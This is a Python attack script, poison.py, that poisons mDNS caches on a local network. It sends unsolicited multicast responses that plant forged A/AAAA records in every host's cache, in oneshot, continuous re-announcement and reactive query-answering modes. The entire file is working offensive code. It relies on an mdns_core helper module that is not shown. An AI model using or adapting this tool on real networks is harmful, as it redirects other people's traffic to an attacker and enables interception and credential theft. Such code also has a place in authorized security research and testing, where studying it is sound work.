"""
poison.py - mDNS cache poisoning via unsolicited responses.

Injects arbitrary A/AAAA records into all hosts' caches on the link.
No query needs to be outstanding -- mDNS caches accept any multicast response
(RFC 6762 Section 18.1).

Modes:
  - oneshot:    Send a single poisoned response
  - continuous: Keep re-announcing to maintain the poisoned entry
  - reactive:   Wait for a query for the target name, then respond
"""

import time
import sys

sys.path.insert(0, __file__.rsplit("/", 2)[0])
from mdns_core import (make_mdns_socket, send_mdns, recv_mdns, parse_packet,
                       build_response, rdata_a, rdata_aaaa,
                       A, AAAA, CACHE_FLUSH, IN)


def oneshot(name: str, ip: str, iface: str | None = None,
            ttl: int = 4500, cache_flush: bool = True, ipv6: bool = False):
    """Send a single poisoned response."""
    sock = make_mdns_socket(iface)
    rtype = AAAA if ipv6 else A
    rdata = rdata_aaaa(ip) if ipv6 else rdata_a(ip)

    pkt = build_response(name, rtype, rdata, ttl=ttl, cache_flush=cache_flush)
    send_mdns(sock, pkt)
    flush_str = " [CACHE-FLUSH]" if cache_flush else ""
    print(f"[+] Sent: {name} -> {ip} (TTL={ttl}){flush_str}")
    sock.close()


def continuous(name: str, ip: str, iface: str | None = None,
               ttl: int = 4500, interval: int = 20, cache_flush: bool = True):
    """Continuously re-announce a poisoned record."""
    sock = make_mdns_socket(iface)
    rtype = A
    rdata = rdata_a(ip)

    print(f"[*] Continuous poison: {name} -> {ip} (interval={interval}s, TTL={ttl})")
    try:
        count = 0
        while True:
            pkt = build_response(name, rtype, rdata, ttl=ttl, cache_flush=cache_flush)
            send_mdns(sock, pkt)
            count += 1
            print(f"  [{count}] Sent announcement")
            time.sleep(interval)
    except KeyboardInterrupt:
        print(f"\n[*] Stopped after {count} announcements")
    sock.close()


def reactive(name: str, ip: str, iface: str | None = None,
             ttl: int = 4500, cache_flush: bool = True):
    """Wait for queries and respond with poisoned data."""
    sock = make_mdns_socket(iface)
    rtype = A
    rdata = rdata_a(ip)
    target_name = name.lower().rstrip(".") + "."

    print(f"[*] Reactive poison: waiting for queries for {name}")
    print(f"[*] Will respond with: {ip} (TTL={ttl})")
    try:
        count = 0
        while True:
            result = recv_mdns(sock, timeout=1.0)
            if result is None:
                continue
            data, (src_ip, src_port) = result
            pkt = parse_packet(data)
            if not pkt or pkt["is_response"]:
                continue

            for q in pkt["questions"]:
                if q["name"].lower() == target_name and q["type_int"] in (A, AAAA, 255):
                    pkt = build_response(name, rtype, rdata, ttl=ttl, cache_flush=cache_flush)
                    send_mdns(sock, pkt)
                    count += 1
                    print(f"  [{count}] Query from {src_ip} for {q['name']} -> responded with {ip}")
    except KeyboardInterrupt:
        print(f"\n[*] Stopped after {count} responses")
    sock.close()


def run(name: str, ip: str, mode: str = "oneshot", iface: str | None = None,
        ttl: int = 4500, interval: int = 20, cache_flush: bool = True):
    if mode == "oneshot":
        oneshot(name, ip, iface, ttl, cache_flush)
    elif mode == "continuous":
        continuous(name, ip, iface, ttl, interval, cache_flush)
    elif mode == "reactive":
        reactive(name, ip, iface, ttl, cache_flush)
    else:
        print(f"Unknown mode: {mode}")
